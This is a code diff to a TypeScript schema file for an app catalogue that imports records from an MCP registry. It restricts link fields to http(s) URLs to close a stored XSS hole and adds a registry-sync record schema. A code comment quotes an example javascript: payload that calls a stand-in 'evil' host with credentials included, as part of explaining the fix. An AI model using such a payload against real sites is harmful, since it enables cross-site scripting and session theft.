@@ -17,6 +17,44 @@ import { NonEmptyStringSchema, TimestampSchema } from './schema-primitives.js'
  * the internal connector model must not leak through it.
  */
 
+// ─── Link fields ────────────────────────────────────────────────────────────
+
+/**
+ * A URL a surface is allowed to render as an `href`.
+ *
+ * `websiteUrl` / `documentationUrl` / `repositoryUrl` reach the catalogue from
+ * an untrusted upstream (the official MCP registry publishes whatever a server
+ * author wrote) and land in the detail page's link list. Declared as a bare
+ * `z.string()` they were stored XSS in the authenticated admin origin: a record
+ * carrying `javascript:fetch('https://evil',{credentials:'include'})` becomes a
+ * clickable link on `/apps/:slug`. The scheme constraint is the contract, and
+ * registry ingestion refuses a non-http(s) value before it is ever persisted.
+ *
+ * Only the scheme is judged here. A hostile *host* is a different question,
+ * answered by the SSRF guard on the endpoints Nessie actually fetches — these
+ * three are shown to a person, never dialled.
+ */
+export const isHttpUrl = (value: string): boolean => {
+  let parsed: URL
+  try {
+    parsed = new URL(value)
+  } catch {
+    return false
+  }
+  return parsed.protocol === 'http:' || parsed.protocol === 'https:'
+}
+
+/** The value when it is safe to render, otherwise nothing — never a throw. */
+export const sanitizeHttpUrl = (value: string | null | undefined): string | null => {
+  if (typeof value !== 'string') return null
+  const trimmed = value.trim()
+  return trimmed.length > 0 && isHttpUrl(trimmed) ? trimmed : null
+}
+
+export const HttpUrlSchema = z.string().refine(isHttpUrl, {
+  message: 'Must be an http(s) URL',
+})
+
 // ─── Categories ─────────────────────────────────────────────────────────────
 
 /**
@@ -222,9 +260,11 @@ export type AppAgentAccessRecord = z.infer<typeof AppAgentAccessRecordSchema>
 
 export const AppDetailRecordSchema = AppSummaryRecordSchema.extend({
   longDescription: z.string().nullable(),
-  websiteUrl: z.string().nullable(),
-  documentationUrl: z.string().nullable(),
-  repositoryUrl: z.string().nullable(),
+  // http(s) only — see `HttpUrlSchema`. These are the fields an ingested
+  // registry record fills, and the detail page renders each as an `href`.
+  websiteUrl: HttpUrlSchema.nullable(),
+  documentationUrl: HttpUrlSchema.nullable(),
+  repositoryUrl: HttpUrlSchema.nullable(),
   // What the app can do, shown before connecting as well as after — the
   // question "is this worth connecting?" is answered by the capability list.
   capabilities: AppCapabilitiesSchema,
@@ -258,3 +298,60 @@ export const AppListResponseSchema = z.object({
   totalCount: z.number().int().nonnegative(),
 })
 export type AppListResponse = z.infer<typeof AppListResponseSchema>
+
+// ─── Registry sync ──────────────────────────────────────────────────────────
+
+/**
+ * One import attempt against the official MCP registry, as an owner sees it.
+ *
+ * The counts are the whole point: a run that completed with
+ * `serversFailed > 0` is the *normal* outcome of one malformed upstream record
+ * among thousands, and saying so is what keeps that from reading as a broken
+ * import. `serversSkipped` is deliberately separate from failed — a
+ * package-only server Nessie cannot install is not an error, it is a record
+ * that does not apply. It carries no database column because it needs none:
+ * every fetched record ends in exactly one of created / updated / skipped /
+ * failed, so `deriveSkippedCount` reconstructs it from the four that are
+ * stored and the two can never disagree.
+ *
+ * `completedAt: null` means the run is still going (or the process died
+ * mid-run, which is the same thing from the outside until the next run starts).
+ * Individual failure detail stays server-side; a member-facing surface never
+ * needs an upstream parse error.
+ */
+export const AppRegistrySyncRunRecordSchema = z.object({
+  id: z.string().uuid(),
+  source: NonEmptyStringSchema,
+  startedAt: TimestampSchema,
+  completedAt: TimestampSchema.nullable(),
+  serversFetched: z.number().int().nonnegative(),
+  serversCreated: z.number().int().nonnegative(),
+  serversUpdated: z.number().int().nonnegative(),
+  serversSkipped: z.number().int().nonnegative(),
+  serversFailed: z.number().int().nonnegative(),
+  /** Words for the person, never an upstream stack trace. */
+  error: z.string().nullable(),
+})
+export type AppRegistrySyncRunRecord = z.infer<
+  typeof AppRegistrySyncRunRecordSchema
+>
+
+/**
+ * Skipped is what is left over once every other outcome is accounted for.
+ * Clamped at zero so a partially-written run (the process died between the
+ * counter update and the completion write) reports an honest 0 rather than a
+ * negative number no reader can interpret.
+ */
+export const deriveSkippedCount = (counts: {
+  serversFetched: number
+  serversCreated: number
+  serversUpdated: number
+  serversFailed: number
+}): number =>
+  Math.max(
+    0,
+    counts.serversFetched
+      - counts.serversCreated
+      - counts.serversUpdated
+      - counts.serversFailed,
+  )
